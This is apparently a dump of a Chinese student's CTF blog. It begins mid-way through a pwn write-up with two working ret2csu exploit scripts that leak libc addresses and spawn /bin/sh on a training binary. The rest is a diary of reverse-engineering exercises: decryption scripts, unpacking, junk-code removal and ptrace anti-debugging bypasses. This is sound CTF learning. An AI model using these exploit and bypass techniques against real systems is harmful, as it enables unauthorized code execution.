arch=&quot;i386&quot;)csu_init_1 = 0x04005F0csu_init_2 = 0x0400606main_addr = 0x0400564write_got = elf.got[&quot;write&quot;]read_got = elf.got[&quot;read&quot;]# bss_base = elf.bss()bss_base = 0x601028libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def csu(rbx, rbp, r12, r13, r14, r15, arg):    payload = b&quot;a&quot; * (128 + 8)    payload += p64(csu_init_2)    payload += p64(0)    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    payload += p64(csu_init_1)    payload += b&quot;a&quot; * (0x38)    payload += p64(arg)    p.sendline(payload)    sleep(1)### leaklibc  write(1, write_got, 8)csu(0, 1, write_got, 1, write_got, 8, main_addr)write_addr = u64(p.recv(8))# libc = LibcSearcher(&quot;write&quot;, write_addr)libc_base = write_addr - libc.sym[&quot;write&quot;]execve_addr = libc_base + libc.sym[&quot;execve&quot;]### read(0, bss_base, 16)&lt;--execve(&quot;/bin/sh&quot;)csu(0, 1, read_got, 0, bss_base, 16, main_addr)p.send(p64(execve_addr) + b&quot;/bin/sh\\x00&quot;)  # 因为正好填满16个字节，所以是sendline### execve(&quot;/bin/sh&quot;, 0, 0)csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)p.interactive()\n\nexp2：\nfrom ctypes import *from struct import packfrom LibcSearcher import *from pwn import *banary = &quot;/home/cake/Documents/pwn/wiki/medium_rop/level5&quot;elf = ELF(banary)ip = &quot;node5.buuoj.cn&quot;port = 25363local = 1if local:    p = process(banary)else:    p = remote(ip, port)context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=&quot;amd64&quot;)# context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=&quot;i386&quot;)csu_init_1 = 0x04005F0csu_init_2 = 0x0400606main_addr = 0x0400564write_got = elf.got[&quot;write&quot;]read_got = elf.got[&quot;read&quot;]# bss_base = elf.bss()bss_base = 0x601028libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)### leaklibc  write(1, write_got, 8)payload = cyclic(0x80 + 8)payload += p64(csu_init_2)payload += p64(0)payload += p64(0)payload += p64(1)payload += p64(write_got)payload += p64(1)payload += p64(write_got)payload += p64(8)payload += p64(csu_init_1)payload += cyclic(0x38)payload += p64(main_addr)p.sendlineafter(b&quot;Hello, World\\n&quot;, payload)sleep(1)write_addr = u64(p.recv(8))# libc = LibcSearcher(&quot;write&quot;, write_addr)libc_base = write_addr - libc.sym[&quot;write&quot;]execve_addr = libc_base + libc.sym[&quot;execve&quot;]### read(0, bss_base, 16)&lt;--execve(&quot;/bin/sh&quot;)payload = cyclic(0x80 + 8)payload += p64(csu_init_2)payload += p64(0)payload += p64(0)payload += p64(1)payload += p64(read_got)payload += p64(0)payload += p64(bss_base)payload += p64(16)payload += p64(csu_init_1)payload += cyclic(0x38)payload += p64(main_addr)p.sendlineafter(b&quot;Hello, World\\n&quot;, payload)sleep(1)p.send(p64(execve_addr) + b&quot;/bin/sh\\x00&quot;)  # 因为正好填满16个字节，所以是sendlinesleep(1)### execve(&quot;/bin/sh&quot;)payload = cyclic(0x80 + 8)payload += p64(csu_init_2)payload += p64(0)payload += p64(0)payload += p64(1)payload += p64(bss_base)payload += p64(bss_base + 8)payload += p64(0)payload += p64(0)payload += p64(csu_init_1)payload += b&quot;/x00&quot; * 0x38payload += p64(main_addr)p.sendafter(b&quot;Hello, World\\n&quot;, payload)p.interactive()\n\n参考：\nwiki\nhttps://www.cnblogs.com/0x200/p/15765759.html\nhttps://wiki.wgpsec.org/knowledge/ctf/ret2csu.html  （图画得真好）\nhttps://blog.csdn.net/qq_29912475/article/details/127701422\n","categories":["CTF"],"tags":["pwn"]},{"title":"日常练习1","url":"/2023/11/18/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/","content":"2023&#x2F;10&#x2F;14reverse_1\n\nstr1和str2要相等。str1是{hello_world}，str2是‘0’\n一开始还没注意到上面\nStr[j] == 111\n\n这个地方，鼠标右键可以转换为字符。\n发现要把helloworld中的o都换成0\nreverse_2exeinfope查看后发现是elf文件，以为不可以在windows上分析，看了wp发现可以。\nida打开时选择所有文件\n双击flag字符串：\n\n\n跟上面那题一样要替换一些字母\n内涵的软件没啥意思，ida打开就看见flag了\n\n\n比较坑的是BUU要都包上flag交。把DBAPP换成flag就好了\n新年快乐发现有壳\n\n\nUPX -&gt; Markus &amp; Laszlo ver. [ 3.91 ]\n尝试手工和自动脱壳\n手工：\nctrl+f搜索popad\n\n\n注意到这个jmp跳的比较不一样，F2设置断点，然后F9运行，F8，到入口了\n然后使用x32dbg的插件Scylla脱壳，这里其实要修改IAT表，但我还不会\n但可以拖到ida，发现程序正常了，找到flag\nxor打开后发现是个异或运算的\n\n\n双击global，发现异或后的flag\n此处可以改成数组方便复制，右键选array\nm = [&#x27;f&#x27;, 0xA, &#x27;k&#x27;, 0xC, &#x27;w&#x27;, &#x27;&amp;&#x27;, &#x27;O&#x27;, &#x27;.&#x27;, &#x27;@&#x27;, 0x11, &#x27;x&#x27;, 0xD, &#x27;Z&#x27;, &#x27;;&#x27;, &#x27;U&#x27;, 0x11, &#x27;p&#x27;, 0x19,     &#x27;F&#x27;, 0x1F, &#x27;v&#x27;, &#x27;&quot;&#x27;, &#x27;M&#x27;, &#x27;#&#x27;, &#x27;D&#x27;, 0xE, &#x27;g&#x27;, 6, &#x27;h&#x27;, 0xF, &#x27;G&#x27;, &#x27;2&#x27;, &#x27;O&#x27;]flag = &#x27;f&#x27;for i in range(len(m) - 1):    if isinstance(m[i], str):  # 若i是str        if isinstance(m[i + 1], str):  # 若i和i+1都是str            s = ord(m[i]) ^ ord(m[i + 1])        else:  # i是str，i+1不是            s = ord(m[i]) ^ m[i + 1]    else:  # i不是str        if isinstance(m[i + 1], str):  # 若i不是str，i+1是            s = m[i] ^ ord(m[i + 1])        else:  # 都不是            s = m[i] ^ m[i + 1]    flag=flag+chr(s)print(flag)\n\nhelloworld拿到一个apk文件。搜了一下很多人用jadx或apkida做的，但是我还没下载。看到了用ida64也可以做，先试一下。\nida：\n打开后直接搜索字符串flag  √\njadx-gui:\n\n\n全部勾选，然后加载更多，找\n\n\nreverse_3ctrl+alt+F  查看加密相关发现base64表\n\n\n输入串为Str\nv3是输入串的长度\nStr经过base64加密后放到v4\nv4放入Destination\n循环对Destination中每个字符加上它的序号\n最后成为Str2\n\n\n所以只要把过程逆一下就好了\nimport base64str2=&#x27;e3nifIH9b_C@n@dH&#x27;str1=&#x27;&#x27;for i in range(len(str2)):    str1=str1+chr(ord(str2[i])-i)print(str1)flag=base64.b64decode(str1)print(flag)\n\n最后的flag是{i_l0ve_you}，有点子浪漫\n不一样的flag首先打开ida发现一串奇怪的字符*11110100001010000101111#\n然后分析代码\n\n\n漏截图exit(1)\n\n\n把奇怪字符串放到v3\n得到我们的输入v5\n若v5&#x3D;1，v3[25]–\n若v5&#x3D;2，v3[25]++\n若v5&#x3D;3，–v4\n若v5&#x3D;4，++v4\n4*i 是因为int类型占有四个字节\n这里判断v3[25]和v3[29]\n在网上搜了发现这是迷宫问题。25和29是我的位置\n49和35的ascii码正好对应1和#\n\n\n那么就是要我移动到#位置\n对  *11110100001010000101111#  进行拆解得到：\n*1111\n01000\n01010\n00010\n1111#\n\n\nflag{222441144222}\nSimpleRev_QWORD   64位整型\n按 r 进行转化\n数据存储是按照大端模式进行，但在读取时需要注意大小端序，下面是以char格式读取，故用时的小端序\nsrc是char\n*(_QWORD *)src &#x3D; 0x534C43444ELL  小端序读取\nsrc为NDCLS\nkey1&#x3D;ADSFK\nkey3&#x3D;kills\nv9也要逆序\nv9&#x3D;hadow\ntext&#x3D;key3++v9&#x3D;killshadow\nkey1–&gt;key\nkey&#x3D;ADSFK\nkey&#x3D;key+src&#x3D;ADSFKNDCLS\nkey转小写\n65–90 大写字母\n97–122 小写字母\n如果大写\n如果小写\nv1是flag\n\n\n最后是爆破做的，因为%26逆不了\ntext = &#x27;killshadow&#x27;key = &#x27;ADSFKNDCLS&#x27;key2 = &#x27;adsfkndcls&#x27;v1 = &#x27;&#x27;for i in range(len(text)):    for x in range(65, 123):        if text[i] == chr((x - 39 - ord(key2[i]) + 97) % 26 + 97):            v1 = v1 + chr(x)            break  # 重要print(&#x27;flag&#123;&#x27;+v1+&#x27;&#125;&#x27;)\n\nJava逆向解密用ja-gui打开\n比较简单\n\n\nkey = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136,       133, 191, 134, 140, 129, 135, 191, 65]flag = &#x27;&#x27;for i in range(len(key)):    s = chr(key[i] - 64 ^ 0x20)    flag=flag+sprint(flag)\n\nal_easy_re\n\n\n\n\n\n还没做出来，我服了。应该是花指令+反调试。花指令应该找的差不多了，反调试好像要在动态调试里做，我还不会…继续卡住。不过好的地方是更了解花指令了，以及ida的一些用法\n412597\n\n\n2023&#x2F;10&#x2F;15luck_guy简单的逆向\n\n\n前面发现f1是GXY{do_not_\nf2=[0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f]f=&#x27;&#x27;for i in range(len(f2)):    if i%2==1:        f2[i]-=2    else:        f2[i]-=1    f=f+chr(f2[i])print(&#x27;GXY&#123;do_not_&#x27;+f)\n\nACTFeasy_Re（未查popad f9 f8 重载 dump\n\n\n发现是一个简单的逆向\n查string发现一个map\nmap=&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\\&#x27;&amp;%$# !&quot;&#x27;v6=[65,67,84,70,123]v4=[0x2a,0x46,0x27,0x22,0x4e,0x2c,0x22,0x28,0x49,0x3f,0x2b,0x40]flag=&#x27;&#x27;for i in v4:    flag+=chr(map.find(chr(i))+1)print(flag)\n\n2023&#x2F;10&#x2F;22JustRE查壳，无\nida打开，看字符串，发现\n双击进去，x看引用\n\n\n填充两个占位符即可\nhua（未无壳，ida打开F5按不了，一片飘红\n去花指令\n这次遇到了call，jmp\n还有莫名其妙的一些add esp，  sub esp\n要修改维持栈帧平衡\n还遇到了leave，直接nop\nleave   =mov esp,esbpop ebp  \n\n去完之后：\n\n\n做不会了，什么玩意rc4，等wp\n原来没有魔改。其实可以做的QAQ\n刮开有奖先看字符串，然后x\n这里f5反汇编的伪代码里面有有a1+ 4 * i，a1+4 *result，这样的字符。但是在逆向的C语言代码中，要把它们的4去掉。因为int占4字节。如果是char的话就不用，因为char是1字节。\na[i]_address = base_address + i * data_type_size\n\n这题的加密也有点难看懂，不过学到了可以不用看懂。。把它拖到dev跑就好了&#x3D; &#x3D;\n\n\n但这里很奇怪啊，ida好像出错了，函数那里只传了v7，但是实际上是把下面的也传了\nc语言跑出来3CEHJNSZagn\n\n\n这里观察得到ak1w和V1Ax是string的两部分分别经过base64加密后得到的\n解密：\nak1w&#x3D;jMp\nV1Ax&#x3D;WP1\nstring[0]&#x3D;v7[0]+34&#x3D;’3’+34&#x3D;’J’\nstring[1]&#x3D;v[10]&#x3D;’N’\nstring[2][3][4]&#x3D;WP1\n567&#x3D;jMp\nflag{UJWP1jMp}\n简单注册机apk文件，用jadx-gui打开\n搜索flag无果，直接看MainActivity\n发现相关代码\n\n\n\n\n比较简单。这里一开始直接对字符串用下标报错了。学习了一下字符串转列表和列表转字符串\n2023&#x2F;10&#x2F;23FuelVM（未wiki上的VM题目，前面的题目涉及到了不是很会，跟着教程学习一下。\n如果很明确一个函数&#x2F;变量的作用，可以按n给它重命名，方便后面分析\nwin32的一些api很有用。比如有输入框的时候，程序要获取用户的输入，那就要调用API，GetDlgItemTextA()\nUINT GetDlgItemTextA(  HWND  hDlg, //在哪个对话框查找目标控件  int   nIDDlgItem,//目标控件的id  LPSTR lpString,  int   cchMax//缓冲区长度);\n\n获取的输入字符串会保存在lpString里. 那么我们就可以打开 IDA 查找有交叉引用GetDlgItemTextA()的地方.\n2023&#x2F;10&#x2F;25pyrekali里面使用pycdc反汇编\n\n\n./pycdc xxx.pyc # 得到py代码./pycdas xxx.pyc # 得到字节码\n\ncode = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;,        &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;,        &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]s=&#x27;&#x27;encode=[]l=len(code)print(l)encode.append(&#x27;\\x13&#x27;)for i in range(l-1):    code[l-i-2]=chr(ord(code[l-i-2])^ord(code[l-i-1]))print(code)for i in range(l):    code[i]=(ord(code[i])-i)%128for i in range(l):    s+=chr(code[i])print(s)\n\n这里发现(xxx+128)%128之后里面的+128消失了，是用来混淆的。\nfindit打开是一个apk文件，使用jajx-gui打开，直接看MainActivity\n\n\n发现只有下面那个循环和密文有关\n然后本来想用java写的，但是发现忘干净了。还是py方便…\nb = [&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;,     &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;]y = []for i in range(len(b)):    y.append(&#x27;&#x27;)print(y)for i in range(len(b)):    if (b[i] &gt;= &#x27;A&#x27; and b[i] &lt;= &#x27;Z&#x27;) or (b[i] &gt;= &#x27;a&#x27; and b[i] &lt;= &#x27;z&#x27;):        y[i] = chr(ord(b[i]) + 16)        if (y[i] &gt; &#x27;Z&#x27; and y[i] &lt; &#x27;a&#x27;) or y[i] &gt;= &#x27;z&#x27;:            y[i] = chr(ord(y[i]) - 26)    else:        y[i] = b[i]print(y)print(&#x27;&#x27;.join(y))nt(&#x27;&#x27;.join(y))\n\nrome\n\nv12 = &#x27;Qsw3sj_lz4_Ujw@l&#x27;# print(len(v12))v12 = list(v12)# print(v12)flag = &#x27;&#x27;for i in range(16):    for j in range(128):  # ascii表上有127个字符，一个个试        x = j        if chr(x).isupper():            x = (x - 51) % 26 + 65        if chr(x).islower():            x = (x - 79) % 26 + 97        if chr(x)==v12[i]:            flag+=chr(j)\n\nrsa第一次拿到看起来不用ida的逆向\n\n\n题目是rsa，里面flag是rsa加密后的flag\npub.key是公钥，拖到在线RSA公钥解析网站得到\n\n\n不过到后面感觉题目有误\n2023&#x2F;10&#x2F;26login简单的js审计，发现是rot13，用厨师打开\nlevel1简单的elf打开逆，给了output\n主要是指针的位置不太一样要注意\n\n\noutput=[198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000]print(len(output))flag=[]for i in range(0,19):    if ((i+1)&amp;1) !=0:        flag.append(chr(output[i]&gt;&gt;i+1))    else:        flag.append(chr(output[i]//(i+1)))  # 整除，无小数print(&#x27;&#x27;.join(flag))\n\nCrackRTF无壳，直接ida然后F5\n\n\n进入sub_40100A\n\n\n发现了一个windows自带的加密库。第二个参数标识了使用何种加密算法。扔进gpt得知是sha1\n然后脚本爆破：\nimport hashlibflag = &#x27;@DBApp&#x27;for i in range(100000,999999):  # 构造字符串    s=str(i)+flag    x=hashlib.sha1(s.encode())    cnt=x.hexdigest()    if &#x27;6e32d0943418c2c&#x27; in cnt: # 检查cnt是否包含该哈希值        print(cnt)        print(str(i)+flag)\n\n得到\n6e32d0943418c2c33385bc35a1470250dd8923a9123321@DBApp\n\n123321即为第一次输入的六位密码\n\n\nsub401019打开发现是md5，但是这次密码没有数值限制，很难爆破。然后看到下面的sub_40100F\nFindResourceA是打开当前的.exe文件中资源文件的文件（可以把自己的资源文件加入.exe文件中）\n\n\n然后看sub_401005\n\n\n发现是把AAA取出来的值和第二次输入的密码异或\n然后把这个值写入dbapp.rtf\n先写入一个空白文件的肯定是文件头。\n所以要得到第二次输入的密码就要把AAA取出的值和rtf的文件头异或。因为是六位密码，所以都取六位就好了。\n关于AAA文件，可以使用Resource Hacker\n\n\ns=&#x27;&#123;\\\\rtf1&#x27;a=[0x05,0x7d,0x41,0x15,0x26,0x01]flag=&#x27;&#x27;for i in range(0,len(s)):    x=ord(s[i])^a[i]    flag+=chr(x)print(flag)\n\n得到第二次输入的~!3a@0\n然后输入到程序就生成了.rtf文件，打开后就得到flag啦。\n这个题不看wp做不出来一点，首先是没遇到过windows自带的加密函数，对windows编程的了解还是太少了。意识到看官方文档和看课本的重要性。做题的时候有时会懒得细抠每一个函数，就会漏掉很多信息！要注意！一些不太明白的函数可以丢到gpt里先看看。\n2023&#x2F;10&#x2F;27maze\n\n感觉找错迷宫了\nre脱壳\n\n\n然后是除法逆向。除一下就得到flag了，但是出题人给少了一位，然后就要爆破一位。\n2023&#x2F;10&#x2F;29昨天在看hackgame，逆向的题都好难QAQ只会签到\n还是看看newstar吧\nsegmentida打开段界面，我的shift+f7会触发电脑功能，然后要在view里面找。\n\n\nELF\n\n\n\n一段加密一段base64\n\n\n这里要注意的是要转列表\nEndian题目是大端小端的意思\nfrom Crypto.Util.number import long_to_bytesv5 = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]for i in range(len(v5)):    v5[i] = v5[i] ^ 0x12345678    v5[i] = long_to_bytes(v5[i])    v5[i] = str(v5[i], &#x27;utf-8&#x27;)    v5[i] = v5[i][::-1]    print(v5[i])flag = &#x27;&#x27;.join(v5)print(flag)\n\n加密就是个异或，因为v5是用char存的，所以是小端序\n2023&#x2F;10&#x2F;30Androxor简单的apk，异或\n\n\n这里可以点左下角的smail\nEzPE打不开exe，用010打开后发现Dos头有误。修改Dos头为5A4D把e_Ifanew 修改为PE偏移0x80\n\n\n然后文件修复成功\n简单的异或\ndata = [0xA, 0xC, 0x4, 0x1F, 0x26, 0x6C, 0x43, 0x2D, 0x3C,        0xC, 0x54, 0x4C, 0x24, 0x25, 0x11, 0x6, 0x5, 0x3A,        0x7C, 0x51, 0x38, 0x1A, 3, 0xD, 1, 0x36, 0x1F, 0x12,        0x26, 4, 0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D]flag=[]l=len(data)flag.append(chr(data[l-1]))l=l-1while(l&gt;0):        data[l-1]=data[l-1]^(l-1)^data[l]        flag.append(chr(data[l-1]))        l-=1print(&#x27;&#x27;.join(flag[::-1]))\n\n注意数据不要复制错误了\nlazy_activity\n\n查找editTextPersonName2\nmakeText:创建并返回一个Toast对象\npublic static Toast makeText(Context context, CharSequence text, int duration)\n\nContext context上下文对象，toast显示的对象\nCharSequence text要显示的消息\nint duration消息显示时长\nPZthon解压后得到一个exe，用peif打开之后发现它可能不止存在一个文件。然后用010打开之后发现有很多个py存在之中，所以考虑到是把pyc打包成exe了。然后解包：\n\n\n在得到的文件夹里找到pzthon的pyc文件，然后反编译。\ngenshin_impact\n\n基本逻辑是输入用户名和密码，用用户名进行rc4加密生成一个base64码表，然后用这个码表对密码进行base64加密\n这里给了用户名的明文，那么就可以把码表跑出来\ngenshin.py\n跑出来之后到厨师解一个换表的base64就可以了\n2023&#x2F;10&#x2F;31SMC\n\n在这两个地方打断点，然后在ida里面动态调试，跳过反调试。然后在smc解密后查看加密的函数逻辑\n\n\nc  p后：\n\n\nenc = [124, 130, 117, 123, 111, 71, 97, 87, 83, 37, 71, 83, 37, 132, 106, 39, 104, 39, 103, 106, 125, 132, 123, 53, 53,       72, 37, 123, 126, 106, 51, 113]for i in range(len(enc)):    enc[i]=enc[i]-5    enc[i]=chr(enc[i]^0x11)print(&#x27;&#x27;.join(enc))\n\npetals去花\n\n\n这是官方题解的花，但是我感觉还有别的。。而且我解不出来加密函数，蜂蜡！\nC?C++?是C#反编译，使用dnSpy\n找到main\n\n\n直接逆。这个界面让我没有这是伪代码的感觉，看着很怪。然后C#一点都不了解，这里面有个溢出的问题要%256，不是很理解\narray = [68, 75, 66, 72, 99, 19, 19, 78, 83, 74, 91, 86, 35, 39, 77, 85, 44, 89, 47, 92, 49, 88, 48, 91, 88, 102, 105,         51, 76, 115, -124, 125, 79, 122, -103]text2 = &quot;NEWSTAR&quot;# array2=textfor j in range(7):    array[j + 28] -= (ord(text2[j]) // 5) + 10    array[j + 21] -= j ^ 2    array[j + 14] -= 2 * j    array[j + 7] -= ord(text2[j]) % 5    array[j] -= j ^ -(ord(text2[j]) % 4)for i in range(35):    array[i] += ord(&#x27; &#x27;)    array[i] -= i    print(chr(array[i] % 256), end=&#x27;&#x27;)\n\n有机会要把这些比较常见的语言都学一下\n2023&#x2F;11&#x2F;1R4ndom直接F5可以发现有个随机函数\n\n\n在main函数前面翻翻可以发现ptrace和设置randomseed\n所以这里有反调试和伪随机数\n\n\nptrace是一个Linux中用于调试的系统调用\nName    ptrace - process traceSYNOPSIS    #include &lt;sys/ptrace.h&gt;    long ptrace(enum __ptrace_request request, pid_t pid,                void *addr, void *data);\n\nptrace提供了一种方法让父进程可以观察和控制其他进程的执行，检查和改变其核心映像以及寄存器。可以实现断点调试和系统调用跟踪。\n函数使用request参数来指定希望执行的行为\nrequest：\n\nPTRACE_TRACEME：本进程将被其父进程跟踪，此时pid、addr、data没有实际意义，可以全部为0\n只能用在被调试的进程中，是被调试的子进程唯一能用的request选项，其他只能被父进程调试器使用\n\nPTRACE_ATTACH：attach到一个指定的进程，使其成为当前进程跟踪的子进程（当前进程喜当爹），被跟踪的子进程的行为就等同于它进行了一次PTRACE_TRACEME，相当于gdb中的attach\n\nPTRACE_CONT：继续运行之前停止的子进程，也可以向子进程发送指定的信号，相当于gdb中的continue\n\n\n本题使用的反调试方法相当于当自己的爹。因为ptrace有规定每个进程只能被PTRACE_TRACEME一次，所以在程序开头执行一次ptrace(PTRACE_TRACEME,0,0,0)，当gdb想调试它的时候就会发现以及执行了一次，不能再执行了，从而返回-1\n绕过方法：\n\n打patch，把ptrace函数的部分nop掉\n\nhook技术，把ptrace函数替换成自定义的ptrace函数，从而可以指定任意的返回值\n\n利用gdb的catch，catch syscall ptrace会在发送ptrace调用的时候停下，因此在第二次停住时set $rax=0,绕过进程中ptrace(PTRACE_TRACEME,0,0,0)==-1的判断\n\n\n\n\n这里面的数据要倒序读出应该是小端序的问题\nflag[i] = Table[(16 * ((unsigned __int8)(data + rand_num % 255) &gt;&gt; 4) + 15) &amp; (unsigned __int8)(data + rand_num % 255)];\n\n关于这句加密我理解的是，16*和右移4位抵消，x为byte类型，x+15&amp;x等于保留x的后4位数字，同时前四位也不变。所以就是flag&#x3D;Table[flag+rand%255]\n\n\n2023&#x2F;11&#x2F;2easy_enc搜索字符串找主函数\n然后发现了4个加密函数，还有密文\n\n\n前三个加密函数都是普通的加减，可以容易地逆过来\n第四个是*52\n\n\n无符号的char类型0-255会溢出，所以最后用了爆破。因为都是字符，所以范围比较小\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123;    __uint8_t enc[30] = &#123;0xE8, 0x80, 0x84, 0x8, 0x18, 0x3C, 0x78, 0x68, 0x0, 0x70, 0x7C, 0x94, 0xC8,                         0xE0, 0x10, 0xEC, 0xB4, 0xAC, 0x68, 0xA8, 0xC, 0x1C, 0x90, 0xCC, 0x54, 0x3C, 0x14, 0xDC, 0x30                        &#125;;    char key[15] = &quot;NewStarCTF&quot;;    for (int i = 0; i &lt; 29; ++i) &#123;        for (__uint8_t j = 32; j &lt;= 127; ++j) &#123; //ascii范围            __uint8_t tmp = j;            if (j &gt;= 65 &amp;&amp; j &lt;= 90) &#123;                j = (j - 52) % 26 + 65;            &#125; else if (j &gt;= 48 &amp;&amp; j &lt;= 57) &#123;                j = (j - 45) % 10 + 48;            &#125; else if (j &gt;= 97 &amp;&amp; j &lt;= 122) &#123;                j = (j - 89) % 26 + 97;            &#125;            j = key[i % strlen(key)] + j;  //为什么是i            j = ~j;            j *= 52;            if (j == enc[i]) &#123;                if((tmp &gt;= &#x27;A&#x27; &amp;&amp; tmp &lt;= &#x27;Z&#x27;) || (tmp &gt;= &#x27;a&#x27; &amp;&amp; tmp &lt;= &#x27;z&#x27;))&#123;                    printf(&quot;%c&quot;, tmp);                &#125;            &#125;            j = tmp;        &#125;    &#125;    return 0;&#125;\n\nAndroDbgme（未使用apktool反编译\napktool d xxx.apk\n\n找到Manifest,添加\nandroid:debuggable=&quot;true&quot;\n\n\n\n重打包\napktool b xxx(文件夹)\n\n重打包后的新apk在dist文件夹里面，挪到外面\n生成密钥库\nkeytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore\n\n\n\n签名\njarsigner -verbose -keystore abc.keystore -signedjar 1_1.apk 1.apk abc.keystore\n\n但后面就不知道这么搞了。jeb下载的好像不对，先搁置一下\n花 去花\n然后rc4\n可以这样提取数组数据，在Edit里\n\n\n是一个没有改动的RC4\n\n\n\n\nEzDLL题目有一个exe和一个dll\n打开exe后会发现有几个tlscallback的函数\ntlscallback可以初始化线程的本地数据，清理线程本地数据，执行其他线程特定的初始化和清理操作\n存在反调试：\n\n\n初始化了一个key数组传给dll：\n\n\n这里IsDebuggerPresent()不存在调试器时的值应该为0\nkey&#x3D;[5,20,13,14]\n打开dll很容易发现一个魔改了的rc4：\n\n\n使用脚本：\n#include&lt;stdio.h&gt;void encrypt(unsigned int* v, unsigned int* key)&#123;    unsigned int l = v[0], r = v[1], sum = 1, delta = 999999999;    for (size_t i = 0; i &lt; 33; i++) &#123;        l += (((r &lt;&lt; 3) ^ (r &gt;&gt; 4)) + r) ^ (sum + key[sum &amp; 3]);        sum += delta;        r += (((l &lt;&lt; 3) ^ (l &gt;&gt; 4)) + l) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);    &#125;    v[0] = l;    v[1] = r;&#125;void decrypt(unsigned int* v, unsigned int* key) &#123;    unsigned int l = v[0], r = v[1], sum = 0, delta = 999999999;    sum = 1+delta * 33;    for (size_t i = 0; i &lt; 33; i++) &#123;        r -= (((l &lt;&lt; 3) ^ (l &gt;&gt; 4)) + l) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);        sum -= delta;        l -= (((r &lt;&lt; 3) ^ (r &gt;&gt; 4)) + r) ^ (sum + key[sum &amp; 3]);    &#125;    v[0] = l;    v[1] = r;&#125;unsigned char a[41] =&#123;  130,67,163,137,111,186,128,200,248,180,86,189,179,65,178,141,218,68,14,4,3,46,56,222,18,84,173,137,149,48,99,33,223,13,148,17,220,178,208,17&#125;;unsigned int key[]=&#123;5,20,13,14&#125;;signed main()&#123;    unsigned int *t=(unsigned int*)a;        for(int i=0;i&lt;9;i+=2)&#123;        decrypt(t+i,key);    &#125;        for (int i = 0; i &lt; 10; i++)    &#123;        printf(&quot;%c%c%c%c&quot;, *((char*)&amp;t[i] + 0), *((char*)&amp;t[i] + 1), *((char*)&amp;t[i] + 2), *((char*)&amp;t[i] + 3));    &#125;&#125;\n","categories":["CTF"],"tags":["CTF"]},{"title":"日常练习2","url":"/2023/11/18/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%952/","content":"2023&#x2F;11&#x2F;3点击就送得到一个.s文件，是gcc汇编后得到的文件。在kali\ngcc -c 1.s       #生成.ogcc 1.o  # 生成a.out\n\n再把a.out拖到ida，简单难度的逆向\n幸运数字\n\n爆破0-999找前四位符合SYC{的\n砍树先用jadx看看主逻辑，大概就是砍树，然后验证flag。但是我砍了777+它给我退出了（怒\n\n\n问题就出在这个哭脸的返回值上。要使它为1！\n用ida打开相应的so层一探究竟\nAlt+F搜索\n\n\n进入之后反汇编看看\n\n\n大概就是text经过处理后和dest相等\n简单的异或\n\n\ndest = [0, 32, 32, 23, 27, 54, 14, 54, 38, 23,        4, 42, 41, 7, 38, 21, 82, 51, 45, 15,        58, 39, 17, 6, 51, 7, 70, 23, 61, 10,        60, 56, 46, 34, 24]S = &quot;Sycloverforerver&quot;S = list(S)text = []for i in range(34):    text.append(chr(dest[i] ^ ord(S[i % 7])))print(&#x27;&#x27;.join(text))\n\n这里一开始想复杂了，看到char给人改成小端了，然后就没出来flag。理解不够到位\ndoublegame(未)\n\n2023&#x2F;&#x2F;11&#x2F;5wordy打开ida发现只反汇编了一小段程序，很多灰色数据部分。然后考虑花指令。这里学习了一下使用自动patch\nstartaddr=0x1135endaddr=0x3100for i in range(startaddr,endaddr):    if get_wide_byte(i)==0xEB:        if get_wide_byte(i+1)==0xFF:            patch_byte(i,0x90)            print(&quot;[+] Addr &#123;&#125; is patched&quot;.format(hex(i)))\n\n然后P一下就都蓝了。翻找一下可以找到flag\nhelp迷宫题\n有个CreateMap()函数，在它后面的跳转点打个断点，动态调试\n\n\n\n\n进入CreateMap()找map\n\n\n\n\n在Export data 